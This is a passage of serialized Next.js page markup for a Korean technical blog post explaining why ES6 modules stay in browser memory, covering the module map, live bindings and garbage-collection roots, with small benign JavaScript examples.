hover:text-foreground\",\"children\":\"소개\"}]]}],[\"$\",\"a\",null,{\"href\":\"https://github.com/leeduhan\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"className\":\"text-muted-foreground transition-colors hover:text-foreground\",\"aria-label\":\"GitHub\",\"children\":[\"$\",\"svg\",null,{\"ref\":\"$undefined\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":24,\"height\":24,\"viewBox\":\"0 0 24 24\",\"fill\":\"none\",\"stroke\":\"currentColor\",\"strokeWidth\":2,\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"className\":\"lucide lucide-github h-5 w-5\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"path\",\"tonef\",{\"d\":\"M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4\"}],[\"$\",\"path\",\"9comsn\",{\"d\":\"M9 18c-4.51 2-5-2-7-2\"}],\"$undefined\"]}]}],[\"$\",\"$L6\",null,{}]]}]]}]}],[\"$\",\"main\",null,{\"className\":\"flex-1\",\"children\":[\"$\",\"div\",null,{\"className\":\"container max-w-4xl mx-auto px-4 py-8\",\"children\":[\"$\",\"$L7\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}],[\"$\",\"footer\",null,{\"className\":\"border-t py-8 md:py-12\",\"children\":[\"$\",\"div\",null,{\"className\":\"container max-w-4xl mx-auto px-4\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col items-center justify-center space-y-4 text-center\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex items-center space-x-4 text-sm\",\"children\":[[\"$\",\"a\",null,{\"href\":\"/rss.xml\",\"className\":\"text-muted-foreground hover:text-primary transition-colors\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"children\":\"RSS\"}],[\"$\",\"span\",null,{\"className\":\"text-muted-foreground\",\"children\":\"•\"}],[\"$\",\"a\",null,{\"href\":\"/feed.json\",\"className\":\"text-muted-foreground hover:text-primary transition-colors\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"children\":\"JSON Feed\"}]]}],[\"$\",\"p\",null,{\"className\":\"text-sm text-muted-foreground\",\"children\":[\"© 2025.06 ~ \",2025,\".\",9,\" Blog\"]}]]}]}]}]]}]}]}]}]]}],{\"children\":[\"posts\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L7\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"technology/2025-09-11-javascript-module-persistent-browser-memory\",\"c\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L7\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L9\",[\"$\",\"$La\",null,{\"children\":\"$Lb\"}],null,[\"$\",\"$Lc\",null,{\"children\":[\"$Ld\",\"$Le\",[\"$\",\"$Lf\",null,{\"promise\":\"$@10\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"rgr3QqCobmtgltZROdQwk\",{\"children\":[[\"$\",\"$L11\",null,{\"children\":\"$L12\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$13\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"14:\"$Sreact.suspense\"\n15:I[74911,[],\"AsyncMetadata\"]\nb:[\"$\",\"$14\",null,{\"fallback\":null,\"children\":[\"$\",\"$L15\",null,{\"promise\":\"$@16\"}]}]\n"])</script><script>self.__next_f.push([1,"9:[[\"$\",\"script\",null,{\"type\":\"application/ld+json\",\"dangerouslySetInnerHTML\":{\"__html\":\"{\\\"@context\\\":\\\"https://schema.org\\\",\\\"@type\\\":\\\"BlogPosting\\\",\\\"headline\\\":\\\"JavaScript 모듈의 영구적인 브라우저 메모리 지속성\\\",\\\"description\\\":\\\"ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다.\\\",\\\"image\\\":[\\\"https://leeduhan.github.io/og-image.jpg\\\"],\\\"author\\\":{\\\"@type\\\":\\\"Person\\\",\\\"name\\\":\\\"지크\\\"},\\\"publisher\\\":{\\\"@type\\\":\\\"Organization\\\",\\\"name\\\":\\\"Blog\\\",\\\"logo\\\":{\\\"@type\\\":\\\"ImageObject\\\",\\\"url\\\":\\\"https://leeduhan.github.io/logo.png\\\"}},\\\"url\\\":\\\"https://leeduhan.github.io/posts/technology/2025-09-11-javascript-module-persistent-browser-memory\\\",\\\"datePublished\\\":\\\"2025-09-11\\\",\\\"dateModified\\\":\\\"2025-09-11\\\",\\\"keywords\\\":\\\"JavaScript, 메모리 관리, 동적 import, 성능 최적화, 메모리 누수, ES6 모듈, 가비지 컬렉션, 브라우저 메모리, 모듈 캐싱, V8 엔진, SPA, 웹 성능, 번들링, CommonJS, 웹 워커, 서비스 워커, 싱글톤 패턴, 라이브 바인딩, 모듈 시스템, 브라우저 엔진, 최적화, 캐싱, 웹개발\\\",\\\"articleSection\\\":\\\"Technology\\\",\\\"inLanguage\\\":\\\"ko-KR\\\"}\"}}],[\"$\",\"div\",null,{\"className\":\"max-w-3xl mx-auto space-y-8\",\"children\":[[\"$\",\"div\",null,{\"className\":\"pt-4\",\"children\":[\"$\",\"$L5\",null,{\"href\":\"/\",\"className\":\"inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors\",\"children\":[[\"$\",\"svg\",null,{\"ref\":\"$undefined\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":24,\"height\":24,\"viewBox\":\"0 0 24 24\",\"fill\":\"none\",\"stroke\":\"currentColor\",\"strokeWidth\":2,\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"className\":\"lucide lucide-arrow-left h-4 w-4\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"path\",\"1l729n\",{\"d\":\"m12 19-7-7 7-7\"}],[\"$\",\"path\",\"x3x0zl\",{\"d\":\"M19 12H5\"}],\"$undefined\"]}],[\"$\",\"span\",null,{\"children\":\"홈으로 돌아가기\"}]]}]}],[\"$\",\"article\",null,{\"className\":\"space-y-8\",\"children\":[[\"$\",\"header\",null,{\"className\":\"space-y-6\",\"children\":[[\"$\",\"div\",null,{\"className\":\"space-y-6\",\"children\":[\"$\",\"h1\",null,{\"className\":\"text-5xl font-bold tracking-tight leading-tight\",\"children\":\"JavaScript 모듈의 영구적인 브라우저 메모리 지속성\"}]}],[\"$\",\"div\",null,{\"className\":\"flex flex-wrap items-center gap-6 text-sm text-muted-foreground py-4\",\"children\":[[\"$\",\"time\",null,{\"dateTime\":\"2025-09-11\",\"className\":\"flex items-center gap-2\",\"children\":[[\"$\",\"span\",null,{\"children\":\"📅\"}],\"2025년 9월 11일\"]}],[\"$\",\"div\",null,{\"className\":\"flex flex-wrap items-center gap-2\",\"children\":[[\"$\",\"span\",null,{\"children\":\"🏷️\"}],[[\"$\",\"$L5\",\"JavaScript\",{\"href\":\"/tags/javascript\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"JavaScript\"}],[\"$\",\"$L5\",\"메모리 관리\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"메모리 관리\"}],[\"$\",\"$L5\",\"동적 import\",{\"href\":\"/tags/import\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"동적 import\"}],[\"$\",\"$L5\",\"성능 최적화\",{\"href\":\"/tags/performance-optimization\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"성능 최적화\"}],[\"$\",\"$L5\",\"메모리 누수\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"메모리 누수\"}],[\"$\",\"$L5\",\"ES6 모듈\",{\"href\":\"/tags/es6\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"ES6 모듈\"}],[\"$\",\"$L5\",\"가비지 컬렉션\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"가비지 컬렉션\"}],[\"$\",\"$L5\",\"브라우저 메모리\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"브라우저 메모리\"}],[\"$\",\"$L5\",\"모듈 캐싱\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"모듈 캐싱\"}],[\"$\",\"$L5\",\"V8 엔진\",{\"href\":\"/tags/v8\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"V8 엔진\"}],[\"$\",\"$L5\",\"SPA\",{\"href\":\"/tags/spa\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"SPA\"}],[\"$\",\"$L5\",\"웹 성능\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"웹 성능\"}],[\"$\",\"$L5\",\"번들링\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"번들링\"}],[\"$\",\"$L5\",\"CommonJS\",{\"href\":\"/tags/commonjs\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"CommonJS\"}],[\"$\",\"$L5\",\"웹 워커\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"웹 워커\"}],[\"$\",\"$L5\",\"서비스 워커\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"서비스 워커\"}],[\"$\",\"$L5\",\"싱글톤 패턴\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"싱글톤 패턴\"}],[\"$\",\"$L5\",\"라이브 바인딩\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"라이브 바인딩\"}],[\"$\",\"$L5\",\"모듈 시스템\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"모듈 시스템\"}],[\"$\",\"$L5\",\"브라우저 엔진\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"브라우저 엔진\"}],[\"$\",\"$L5\",\"최적화\",{\"href\":\"/tags/unknown-tag\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"최적화\"}],[\"$\",\"$L5\",\"캐싱\",{\"href\":\"/tags/caching\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"캐싱\"}],[\"$\",\"$L5\",\"웹개발\",{\"href\":\"/tags/web-dev-kr\",\"className\":\"inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-accent text-accent-foreground hover:bg-primary hover:text-primary-foreground transition-colors\",\"children\":\"웹개발\"}]]]}]]}],[\"$\",\"div\",null,{\"className\":\"bg-accent/50 rounded-lg p-6 border-l-4 border-primary\",\"children\":[\"$\",\"p\",null,{\"className\":\"text-lg leading-relaxed italic text-muted-foreground\",\"children\":\"ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다.\"}]}]]}],[\"$\",\"div\",null,{\"className\":\"notion-content\",\"children\":\"$L17\"}]]}]]}]]\n"])</script><script>self.__next_f.push([1,"e:null\n"])</script><script>self.__next_f.push([1,"18:I[18199,[\"6249\",\"static/chunks/cb15b0f3-4f54b17909709afc.js\",\"6874\",\"static/chunks/6874-fa507aafc07af06a.js\",\"9522\",\"static/chunks/9522-efe1b27bdbdfccd2.js\",\"6156\",\"static/chunks/app/posts/%5B...slug%5D/page-533962adf6041fb8.js\"],\"CodeBlock\"]\n"])</script><script>self.__next_f.push([1,"17:[[\"$\",\"h1\",null,{\"id\":\"javascript-모듈의-영구적인-브라우저-메모리-지속성\",\"children\":\"JavaScript 모듈의 영구적인 브라우저 메모리 지속성\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"JavaScript ES6 모듈은 \",[\"$\",\"strong\",null,{\"children\":\"JavaScript 영역(realm)의 생명주기 동안 개별적으로 가비지 컬렉션이 불가능\"}],\"하며, 모듈 식별자(specifier) 문자열로 인덱스된 모듈 레지스트리에 영구적으로 캐시됩니다. 이러한 근본적인 제약은 모듈이 한 번 로드되면, 정적 \",[\"$\",\"code\",null,{\"children\":\"import\"}],\"든 동적 \",[\"$\",\"code\",null,{\"children\":\"import()\"}],\"든 관계없이 전체 JavaScript 컨텍스트가 파괴될 때까지(페이지 이동 또는 탭 닫기) 메모리에 지속됨을 의미합니다. 이 연구 문서는 모듈 메모리 관리 메커니즘, 브라우저 구현, 그리고 모듈 기반 애플리케이션의 메모리 관리를 위한 실용적 전략에 대한 포괄적인 기술 분석을 제공합니다.\"]}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"핵심-원리와-메커니즘\",\"children\":\"핵심 원리와 메커니즘\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"브라우저에서-es6-모듈의-가비지-컬렉션-동작-방식\",\"children\":\"브라우저에서 ES6 모듈의 가비지 컬렉션 동작 방식\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"ES6 모듈은 영구적인 메모리 관계를 설정하는 3단계 생명주기를 통해 작동합니다. \",[\"$\",\"strong\",null,{\"children\":\"구성(construction) 단계\"}],\"에서는 모듈 파일을 가져와서 Module Record로 파싱합니다. \",[\"$\",\"strong\",null,{\"children\":\"인스턴스화(instantiation) 단계\"}],\"에서는 라이브 바인딩을 통해 export와 import를 위한 메모리 위치를 할당합니다 - 이는 값을 복사하는 CommonJS와는 중요한 차이점입니다. 마지막으로 \",[\"$\",\"strong\",null,{\"children\":\"평가(evaluation) 단계\"}],\"에서는 모듈 코드를 정확히 한 번 실행하여 할당된 메모리 위치를 채웁니다.\"]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"라이브-바인딩live-binding의-핵심-메커니즘\",\"children\":\"라이브 바인딩(Live Binding)의 핵심 메커니즘\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"라이브 바인딩\"}],\"은 ES6 모듈에서 import된 값들이 export하는 모듈의 원본 값에 대한 \\\"살아있는\\\" 참조를 제공하는 메커니즘입니다. ES6 모듈이 CommonJS와 근본적으로 다른 이유이자, 모듈이 메모리에서 영구히 지속되는 핵심 메커니즘입니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"🔑 핵심 개념:\"}]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"동일한 메모리 위치 공유\"}],\": import와 export가 같은 메모리 주소를 참조\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"실시간 동기화\"}],\": export 모듈의 값 변경이 모든 import 모듈에 즉시 반영\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"참조 기반\"}],\": 값 복사가 아닌 참조 공유 방식\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"값을 import할 때, import하는 모듈과 export하는 모듈 모두 동일한 메모리 위치를 가리킵니다:\"}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 모듈 A가 변경 가능한 값을 export\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" counter \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"increment\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" counter\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"++\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 모듈 B가 import하고 라이브 변경사항을 관찰\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" counter\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" increment \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./moduleA.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token console class-name\",\"children\":\"console\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"log\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"counter\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 0\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"increment\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token console class-name\",\"children\":\"console\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"log\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"counter\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 1 - 라이브 바인딩이 변경사항을 반영\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"이는 가비지 컬렉션 동작에 근본적으로 영향을 미치는 영구적 참조를 생성합니다. 참조가 없어지면 수집될 수 있는 전통적인 JavaScript 객체와 달리, 모듈은 이러한 라이브 바인딩을 통해 영구적인 관계의 망을 만듭니다.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"🔗 메모리 참조 체인:\"}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"code-highlight\",\"data-language\":\"\",\"children\":[\"$\",\"code\",null,{\"className\":\"code-highlight\",\"children\":[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":\"GC Root → Module Map → Module A ⟷ Shared Memory ⟷ Module B\\n\"}]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"이 참조 체인 때문에 개별 모듈은 가비지 컬렉션될 수 없으며, 전체 JavaScript 컨텍스트가 파괴될 때까지 메모리에 유지됩니다.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"⚡ 실무 영향:\"}]}],\"\\n\",[\"$\",\"ol\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"DataManager\"}],\" 같은 싱글톤은 의도적으로 지속되어야 하는 사례\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"큰 데이터나 이벤트 리스너\"}],\"는 명시적 정리가 필요\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"SPA 환경\"}],\"에서는 특히 메모리 관리에 주의해야 함\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-레지스트리와-gc-root-관계\",\"children\":\"모듈 레지스트리와 GC Root 관계\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"브라우저의 \",[\"$\",\"strong\",null,{\"children\":\"모듈 맵\"}],\"은 로딩 캐시이자 가비지 컬렉션 루트 세트의 기본 부분으로 작동합니다. 이 레지스트리는 모든 로드된 모듈을 정규 URL로 키로 하여 유지하며, GC 루트에서 모든 로드된 모듈로의 직접 경로를 만듭니다:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 개념적 모듈 맵 구조\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ModuleMap\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token string-property property\",\"children\":\"\\\"https://example.com/module.js\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"status\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"evaluated\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"moduleRecord\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ModuleRecord\"}],[\"$\",\"span\",null,{\"className\":\"token 